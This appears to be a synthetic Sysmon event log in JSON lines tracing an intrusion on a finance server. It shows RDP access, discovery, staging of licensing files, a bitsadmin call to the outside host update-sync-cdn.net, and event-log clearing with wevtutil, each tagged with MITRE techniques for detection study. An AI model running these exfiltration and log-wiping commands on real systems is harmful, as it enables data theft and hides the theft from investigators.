{"@timestamp":"2024-11-15T18:16:04.330Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":82100,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"ingress","transport":"tcp","type":"ipv4"},"source":{"ip":"10.10.1.77","port":52100},"destination":{"ip":"10.10.2.41","port":3389},"process":{"name":"svchost.exe","pid":908},"user":{"name":"SYSTEM","domain":"NT AUTHORITY"},"host":{"name":"SERVER-FIN-01","hostname":"SERVER-FIN-01.lifetechpharma.local"},"rule":{"name":"rdp_inbound_connection"}}
{"@timestamp":"2024-11-15T18:17:11.450Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82108,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"cmd.exe","pid":4120,"executable":"C:\\Windows\\System32\\cmd.exe","command_line":"cmd.exe /c whoami /all","parent":{"name":"rdpclip.exe","pid":4088}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"process_creation_via_rdp"}}
{"@timestamp":"2024-11-15T18:18:03.220Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82114,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"powershell.exe","pid":4240,"executable":"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe","command_line":"powershell.exe -Command \"Get-ChildItem -Path \\\\SERVER-RD-02\\LicenseDeals\\USPartner2024\\ -Recurse | Select Name,Length,LastWriteTime\"","parent":{"name":"cmd.exe","pid":4120}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1083,technique_name=File_Directory_Discovery"}}
{"@timestamp":"2024-11-15T18:22:44.780Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82130,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"robocopy.exe","pid":4380,"executable":"C:\\Windows\\System32\\Robocopy.exe","command_line":"robocopy \\\\SERVER-RD-02\\LicenseDeals\\USPartner2024 C:\\Windows\\Temp\\~sync2024 /E /Z /R:0 /W:0","parent":{"name":"cmd.exe","pid":4120}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1039,technique_name=Data_from_Network_Shared_Drive"}}
{"@timestamp":"2024-11-15T18:31:02.110Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":11,"record_id":82190,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"11"},"file":{"path":"C:\\Windows\\Temp\\~sync2024\\","name":"USPartner2024_LicenseAgreement_Final.pdf"},"process":{"name":"robocopy.exe","pid":4380},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"large_file_staging_temp"}}
{"@timestamp":"2024-11-15T18:31:55.600Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82200,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"bitsadmin.exe","pid":4590,"executable":"C:\\Windows\\System32\\bitsadmin.exe","command_line":"bitsadmin /transfer \"SyncJob001\" /download /priority FOREGROUND https://update-sync-cdn.net/upload?id=fin01_2024 C:\\Windows\\Temp\\dummy.bin","parent":{"name":"cmd.exe","pid":4120}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1197,technique_name=BITS_Jobs"}}
{"@timestamp":"2024-11-15T18:32:11.888Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":3,"record_id":82205,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"3"},"network":{"direction":"egress","transport":"tcp","type":"ipv4"},"destination":{"ip":"203.0.113.87","port":443},"source":{"ip":"10.10.2.41","port":53004},"process":{"name":"svchost.exe","pid":908},"user":{"name":"SYSTEM","domain":"NT AUTHORITY"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1197,technique_name=BITS_Jobs_C2"}}
{"@timestamp":"2024-11-15T18:47:03.910Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82280,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"wevtutil.exe","pid":5100,"executable":"C:\\Windows\\System32\\wevtutil.exe","command_line":"wevtutil.exe cl Security","parent":{"name":"cmd.exe","pid":4120}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1070.001,technique_name=Clear_Windows_Event_Logs"}}
{"@timestamp":"2024-11-15T18:47:09.224Z","winlog":{"channel":"Microsoft-Windows-Sysmon/Operational","event_id":1,"record_id":82281,"computer_name":"SERVER-FIN-01.lifetechpharma.local"},"event":{"code":"1"},"process":{"name":"wevtutil.exe","pid":5108,"executable":"C:\\Windows\\System32\\wevtutil.exe","command_line":"wevtutil.exe cl System","parent":{"name":"cmd.exe","pid":4120}},"user":{"name":"p.levi","domain":"LIFETECHPHARMA"},"host":{"name":"SERVER-FIN-01"},"rule":{"name":"technique_id=T1070.001,technique_name=Clear_Windows_Event_Logs"}}
